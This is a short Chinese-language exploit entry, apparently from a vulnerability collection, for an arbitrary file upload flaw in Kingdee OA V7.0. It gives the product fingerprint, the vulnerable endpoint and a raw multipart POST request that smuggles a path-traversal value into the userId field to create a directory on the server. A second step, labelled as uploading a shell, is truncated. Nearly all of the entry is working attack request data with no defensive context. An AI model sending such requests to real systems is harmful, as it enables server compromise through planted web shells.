# ⾦蝶OAKingdeeOAPostilUpload任意⽂件上传

- **系统**：金蝶　|　**类型**：其他　|　**CVE**：—
- **指纹**：`⾦蝶OA_V7.0`
- **请求**：`POST /KingdeeOA/upload.do?m=officeUpload&id=1&uuid=2 HTTP/1.1`

**请求体 / payload**
```
**1.创建目录**
Host:
Content-Length: 463
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoPv4NqpaclOcBTeT
------WebKitFormBoundaryoPv4NqpaclOcBTeT
Content-Disposition: form-data; name="token"
Content-Type: text/plain
11
------WebKitFormBoundaryoPv4NqpaclOcBTeT
Content-Disposition: form-data; name="userId"
Content-Type: text/plain
../../../workflow/temporary/scan_temp_test
------WebKitFormBoundaryoPv4NqpaclOcBTeT
Content-Disposition: form-data; name="upload"; filename="1.txt"
Content-Type: text/plain
test
------WebKitFormBoundaryoPv4NqpaclOcBTeT--
**2.上传shell**
POST /KingdeeOA/Pos…（脚本共 1760 字，完整版见原文）
```
- **预期**：200　|　—